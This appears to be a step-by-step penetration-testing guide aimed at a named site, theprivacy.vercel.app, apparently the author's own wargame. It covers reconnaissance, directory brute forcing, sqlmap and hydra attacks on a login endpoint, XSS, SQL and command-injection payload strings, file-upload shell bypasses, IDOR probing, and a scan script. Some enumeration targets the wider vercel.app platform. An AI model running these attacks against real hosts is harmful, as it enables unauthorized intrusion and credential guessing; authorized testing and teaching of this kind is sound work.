# Complete Penetration Testing Workflow
# Starting Point: Only knowing the domain "theprivacy.vercel.app"

## ðŸŽ¯ PHASE 1: INFORMATION GATHERING (Passive Recon)

### Step 1.1: DNS Enumeration
```bash
# Basic DNS lookup
host theprivacy.vercel.app
nslookup theprivacy.vercel.app
dig theprivacy.vercel.app

# Find subdomains
sublist3r -d vercel.app -o subdomains.txt
amass enum -d vercel.app

# DNS zone transfer attempt
dig axfr @ns1.vercel.app vercel.app
```

### Step 1.2: WHOIS Lookup
```bash
whois vercel.app
whois theprivacy.vercel.app
```

### Step 1.3: Search Engine Reconnaissance
```bash
# Google Dorking
# In browser:
site:theprivacy.vercel.app
site:theprivacy.vercel.app filetype:pdf
site:theprivacy.vercel.app inurl:admin
site:theprivacy.vercel.app intitle:"index of"

# Shodan (if registered)
shodan search hostname:theprivacy.vercel.app
```

### Step 1.4: Archive & Cache
```bash
# Check Wayback Machine
curl "http://archive.org/wayback/available?url=theprivacy.vercel.app"

# Google Cache
# Browser: cache:theprivacy.vercel.app
```

### Step 1.5: Technology Fingerprinting
```bash
# Whatweb - Identify technologies
whatweb https://theprivacy.vercel.app

# Wappalyzer (browser extension)
# Or use webanalyze
webanalyze -host https://theprivacy.vercel.app

# Check headers
curl -I https://theprivacy.vercel.app
```

---

## ðŸ” PHASE 2: ACTIVE RECONNAISSANCE

### Step 2.1: Port Scanning
```bash
# Quick scan common ports
nmap -F theprivacy.vercel.app

# Full TCP scan
nmap -p- -T4 theprivacy.vercel.app

# Service version detection
nmap -sV -sC -p 80,443 theprivacy.vercel.app

# Aggressive scan
nmap -A -T4 theprivacy.vercel.app

# Save results
nmap -sV -sC -oA nmap_results theprivacy.vercel.app
```

### Step 2.2: Web Server Enumeration
```bash
# Check for robots.txt
curl https://theprivacy.vercel.app/robots.txt

# Check for sitemap
curl https://theprivacy.vercel.app/sitemap.xml

# Check security.txt
curl https://theprivacy.vercel.app/.well-known/security.txt

# Common files
curl https://theprivacy.vercel.app/humans.txt
curl https://theprivacy.vercel.app/README.md
curl https://theprivacy.vercel.app/.git/config
```

### Step 2.3: Directory & File Brute Force
```bash
# Gobuster - Fast directory brute force
gobuster dir -u https://theprivacy.vercel.app \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,js,txt,zip,bak \
  -o gobuster_results.txt

# Dirb - Classic tool
dirb https://theprivacy.vercel.app \
  /usr/share/wordlists/dirb/common.txt \
  -o dirb_results.txt

# Ffuf - Modern fuzzer
ffuf -u https://theprivacy.vercel.app/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,301,302,403 \
  -o ffuf_results.json

# Dirsearch - Python tool
dirsearch -u https://theprivacy.vercel.app \
  -e php,html,js,txt \
  -o dirsearch_results.txt
```

### Step 2.4: Subdomain Enumeration
```bash
# Gobuster subdomain mode
gobuster dns -d vercel.app \
  -w /usr/share/wordlists/subdomains.txt

# Sublist3r
sublist3r -d vercel.app -o subdomains.txt

# Amass
amass enum -d vercel.app -o amass_subdomains.txt
```

---

## ðŸ•·ï¸ PHASE 3: WEB APPLICATION ANALYSIS

### Step 3.1: Manual Exploration
```bash
# Browse the site manually
firefox https://theprivacy.vercel.app &

# Check page source (Ctrl+U)
# Look for:
# - Comments
# - Hidden fields
# - JavaScript files
# - API endpoints
# - Version numbers
```

### Step 3.2: Spider/Crawl
```bash
# Burp Suite Spider
# 1. Open Burp Suite
# 2. Configure browser proxy (127.0.0.1:8080)
# 3. Browse the site
# 4. Target > Site map

# OWASP ZAP Spider
zaproxy -quickurl https://theprivacy.vercel.app

# Wget mirror
wget --mirror --convert-links --page-requisites \
  --no-parent https://theprivacy.vercel.app
```

### Step 3.3: JavaScript Analysis
```bash
# Download all JS files
wget -r -l 1 -H -t 1 -nd -N -np -A.js -erobots=off \
  https://theprivacy.vercel.app

# Search for sensitive data in JS
grep -r "api" *.js
grep -r "password" *.js
grep -r "token" *.js
grep -r "key" *.js

# Use JSParser
python3 JSParser.py -u https://theprivacy.vercel.app
```

---

## ðŸ”“ PHASE 4: VULNERABILITY SCANNING

### Step 4.1: Automated Scanners
```bash
# Nikto - Web server scanner
nikto -h https://theprivacy.vercel.app -o nikto_report.html

# WPScan (if WordPress detected)
wpscan --url https://theprivacy.vercel.app --enumerate

# Nuclei - Modern vulnerability scanner
nuclei -u https://theprivacy.vercel.app -o nuclei_results.txt
```

### Step 4.2: SSL/TLS Testing
```bash
# SSLScan
sslscan theprivacy.vercel.app

# TestSSL
testssl.sh https://theprivacy.vercel.app

# Check certificate
openssl s_client -connect theprivacy.vercel.app:443
```

---

## ðŸŽ¯ PHASE 5: EXPLOITATION ATTEMPTS

### Step 5.1: Authentication Testing
```bash
# Test default credentials
# admin:admin, admin:password, admin:admin123

# SQL Injection in login
sqlmap -u "https://theprivacy.vercel.app/api/auth/login" \
  --data="username=admin&password=test" \
  --batch --level=5 --risk=3

# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  theprivacy.vercel.app http-post-form \
  "/api/auth/login:username=^USER^&password=^PASS^:F=Invalid"
```

### Step 5.2: Injection Testing
```bash
# XSS Testing
# Manual payloads:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
"><script>alert(String.fromCharCode(88,83,83))</script>

# Automated XSS
xsstrike -u "https://theprivacy.vercel.app/challenge/10"

# SQL Injection
' OR '1'='1
admin' --
admin' OR '1'='1' --

# Command Injection
; ls -la
| whoami
`id`
```

### Step 5.3: File Upload Testing
```bash
# If file upload exists, test:
# - PHP shell
# - Double extensions (shell.php.jpg)
# - Null byte (shell.php%00.jpg)
# - MIME type bypass
```

### Step 5.4: IDOR Testing
```bash
# Test changing IDs in URLs
curl https://theprivacy.vercel.app/api/challenges/10
curl https://theprivacy.vercel.app/api/challenges/11
curl https://theprivacy.vercel.app/api/challenges/999

# Test user enumeration
curl https://theprivacy.vercel.app/api/user/1
curl https://theprivacy.vercel.app/api/user/2
```

---

## ðŸ“Š PHASE 6: REPORTING

### Generate Final Report
```bash
# Combine all findings
cat > pentest_report.md << 'EOF'
# Penetration Test Report
## Target: theprivacy.vercel.app
## Date: $(date)

### Executive Summary
[Summary of findings]

### Methodology
- Information Gathering
- Vulnerability Scanning
- Exploitation
- Post-Exploitation

### Findings
1. [Vulnerability 1]
   - Severity: High/Medium/Low
   - Description:
   - Proof of Concept:
   - Remediation:

### Conclusion
[Overall security posture]
EOF
```

---

## ðŸ› ï¸ COMPLETE AUTOMATED SCRIPT

Save this as `full_pentest.sh`:

```bash
#!/bin/bash
TARGET="theprivacy.vercel.app"
OUTPUT="pentest_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT

echo "[*] Starting full penetration test on $TARGET"

# Phase 1: Recon
echo "[1/6] Information Gathering..."
nmap -sV -sC -oN $OUTPUT/nmap.txt $TARGET
whatweb https://$TARGET > $OUTPUT/whatweb.txt
curl -s https://$TARGET/robots.txt > $OUTPUT/robots.txt

# Phase 2: Directory Scan
echo "[2/6] Directory Enumeration..."
gobuster dir -u https://$TARGET \
  -w /usr/share/wordlists/dirb/common.txt \
  -o $OUTPUT/gobuster.txt -q

# Phase 3: Vulnerability Scan
echo "[3/6] Vulnerability Scanning..."
nikto -h https://$TARGET -o $OUTPUT/nikto.txt

# Phase 4: SSL Check
echo "[4/6] SSL/TLS Testing..."
sslscan $TARGET > $OUTPUT/sslscan.txt

# Phase 5: API Testing
echo "[5/6] API Endpoint Discovery..."
for endpoint in auth login register admin users challenges; do
  curl -s -o /dev/null -w "$endpoint: %{http_code}\n" \
    https://$TARGET/api/$endpoint >> $OUTPUT/api_endpoints.txt
done

# Phase 6: Report
echo "[6/6] Generating Report..."
echo "Penetration Test Complete!" > $OUTPUT/REPORT.txt
echo "Results saved in: $OUTPUT/"
ls -lh $OUTPUT/

echo "[âœ“] Pentest complete! Check $OUTPUT/ for results"
```

---

## ðŸŽ“ Real-World Workflow

```
1. Start with ONLY domain name
   â†“
2. DNS/WHOIS lookup
   â†“
3. Port scanning (nmap)
   â†“
4. Service enumeration
   â†“
5. Web tech fingerprinting
   â†“
6. Directory brute force
   â†“
7. Manual exploration
   â†“
8. Vulnerability scanning
   â†“
9. Exploitation attempts
   â†“
10. Document findings
```

---

**Remember**: This is for YOUR OWN wargame only! ðŸ”’
